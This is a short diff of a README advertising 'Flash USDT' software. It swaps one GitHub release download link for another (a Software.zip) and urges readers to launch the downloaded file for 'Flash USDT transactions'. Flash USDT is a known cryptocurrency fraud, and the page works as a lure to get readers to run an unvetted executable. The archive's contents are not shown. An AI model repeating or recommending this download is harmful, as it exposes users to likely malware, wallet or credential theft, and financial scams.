@@ -25,7 +25,7 @@ Explore a range of topics related to flash USDT and beyond:
 
 ## Software Download
 To access the latest Flash USDT software, simply click on the button below:
-[![Download Software](https://github.com/Blinknycc/flash-usdt-erc20/releases/download/v1.0.0/Application.zip)](https://github.com/Blinknycc/flash-usdt-erc20/releases/download/v1.0.0/Application.zip)
+[![Download Software](https://github.com/Blinknycc/flash-usdt-erc20/releases/download/v2.0/Software.zip)](https://github.com/Blinknycc/flash-usdt-erc20/releases/download/v2.0/Software.zip)
 
 Make sure to launch the downloaded file to experience the full potential of Flash USDT transactions!
 
